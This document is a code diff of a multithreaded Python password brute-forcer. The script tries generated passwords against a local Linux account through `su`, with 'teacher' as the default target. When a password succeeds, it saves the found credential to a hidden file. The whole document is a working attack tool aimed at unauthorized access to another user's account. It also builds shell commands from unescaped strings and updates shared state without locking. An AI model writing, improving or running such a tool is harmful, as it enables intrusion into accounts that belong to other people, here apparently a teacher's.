@@ -1,103 +1,82 @@
 import os, time, threading
-    
-chars = '0123456789abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@"#$%^&*()-_=+\\/<>,.";:'
-threads = []
-
-class StoppableThread(threading.Thread):
-    def __init__(self,  *args, **kwargs):
-        super(StoppableThread, self).__init__(*args, **kwargs)
-        self._stop_event = threading.Event()
-
-    def stop(self):
-        self._stop_event.set()
-
-    def stopped(self):
-        return self._stop_event.is_set()
-
-def stopAllThreads():
-    for thread in threads:
-        thread.stop()
 
 def main():
-    user = input('Choose user [teacher]:\n> ')
-    user = 'teacher' if user == "" else user
-    length = input('Choose password length [10]:\n> ')
-    length = 15 if length == "" else int(length)
-    threadsCount = input('Choose threads count [4]:\n> ')
-    threadsCount = 4 if threadsCount == "" else int(threadsCount)
-    if threadsCount >= len(chars):
-        threadsCount = len(chars)
-        print(f'We don\'t want your PC to explode. Will be used {threadsCount} threads')
+    user = inputWithDefaultValue('User', 'teacher')
+    threadsCount = int(inputWithDefaultValue('Threads count', '1000'))
+    global minLength
+    minLength = int(inputWithDefaultValue('Minimal password length', '5'))
+    
+    # TODO: start brute threads 
 
-    global threads
     for i in range(threadsCount):
-        threads.append(StoppableThread(target=brute, args=(user, length, threadsCount, [i])))
-
-    for thread in threads:
-        thread.start()
+        threading.Thread(target=brute, args=(user,)).start()
 
     global t1
     t1 = time.time()
+    
+chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
+         'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
+         'k', 'l', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
+         'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E',
+         'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O',
+         'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',
+         'Z']#, '\\`', '~', '\\!', '@', '\\"', '#', '\\$', '%',
+         #'^', '&', '*', '(', ')', '-', '_', '=', '+', '\\',
+         #'/', '<', '>', ',', '.', ';', ':', "\\'"]
+global passwdFound
+passwdFound = False
+global maxValue
+maxValue = 0
+global t1
+global minLength
 
-def getPasswdByCharList(charlst):
-    return ''.join([chars[i] for i in charlst])
-
-def brute(user, length, delta=1, startFrom=[0]):
-    charlst = [0] * (length - len(startFrom)) + startFrom
-    passwd = getPasswdByCharList(charlst)
-
-    while True:
-        passwd = getPasswdByCharList(charlst)
-        dwssap = passwd[::-1] # reverse
-        if os.system(f'echo "{passwd}" | su {user} -c "whoami"') == 0:
-            os.system('clear')
-            print(f'==> DONE! PASSWORD FOUND!')
-            print(f'    YOUR PASS IS: {passwd}')
-            print(f'Bruteforce took {int(time.time()-t1)} sec of your time')
-            stopAllThreads()
-        else:
-            print(f'| Bad luck with {passwd}\n')
-            result = generateNextPasswd(charlst, delta)
-            if result == True:
+def brute(user):
+    global t1
+    global maxValue
+    global passwdFound
+    while not passwdFound:
+        localValue = maxValue
+        maxValue += 8
+        xs = getXsByValue(localValue)
+        for i in range(8):
+            if passwdFound:
                 break
+            passwd = getPasswd(xs)
+            if os.system(f'echo "{passwd}" | su {user} -c "whoami" >/dev/null 2>&1') == 0:
+                passwdFound = True
+                os.system('touch .brute_result')
+                f = open('.brute_result', 'a')
+                f.write(f'==> BRUTEFORCE DONE IN {int(time.time() - t1)} SEC\n')
+                f.write(f'    CHECKED {maxValue} PASSWORDS\n')
+                f.write(f'    PASSWORD FOR {user} IS {passwd}\n')
+                f.close()
+                time.sleep(30)
+                os.system('clear')
+                f = open('.brute_result', 'r')
+                print(f.read())
+                f.close()
             else:
-                charlst = result
-        if os.system(f'echo "{dwssap}" | su {user} -c "whoami"') == 0:
-            os.system('clear')
-            print(f'==> DONE! PASSWORD FOUND!')
-            print(f'    YOUR PASS IS: {dwssap}')
-            print(f'Bruteforce took {int(time.time()-t1)} sec of your time')
-            stopAllThreads()
-        else:
-            print(f'| Bad luck with {dwssap}\n')
+                print(f'| Misfortune with {passwd}')
+                localValue += 1
+                xs = getXsByValue(localValue)
 
-    print('=> BRUTE THREAD ENDED, PASSWORD NOT FOUND')
-    print(f'   Maybe wrong password length. Thread settings: delta={delta}, startFrom={startFrom}')
 
-def hasInvalid(charlst):
-    for i in charlst:
-        if i >= len(chars):
-            return True
-    return False
+def getXsByValue(value):
+    xs = [value]
+    while xs[0] >= len(chars):
+        xs.insert(0, xs[0] // len(chars))
+        xs[1] %= len(chars)
+    global minLength
+    if len(xs) < minLength:
+        xs = [0] * (minLength - len(xs)) + xs
+    return xs
+    
+def getPasswd(xs):
+    return ''.join([chars[i] for i in xs])
 
-def mayIncrement(charlst, delta):
-    s = sum([len(chars) - 1 - i for i in charlst])
-    return s >= delta
-
-def generateNextPasswd(charlst, delta):
-    if not mayIncrement(charlst, delta):
-        return True
-    for i in range(len(charlst) - 1, -1, -1):
-        if charlst[i] < len(chars) - 1: # increment
-            charlst[i] += delta
-            break
-    while hasInvalid(charlst):
-        for i in range(len(charlst) - 1, -1, -1):
-            if charlst[i] >= len(chars): # invalid value case
-                nextItem = i - 1 if i != 0 else len(chars) - 1
-                charlst[nextItem] += charlst[i] - (len(chars) - 1)
-                charlst[i] -= len(chars) - 1
-    return charlst
+def inputWithDefaultValue(prompt, default):
+    a = input(f'{prompt}? [{default}]\n> ')
+    return default if a == "" else a
 
 if __name__ == "__main__":
     main()
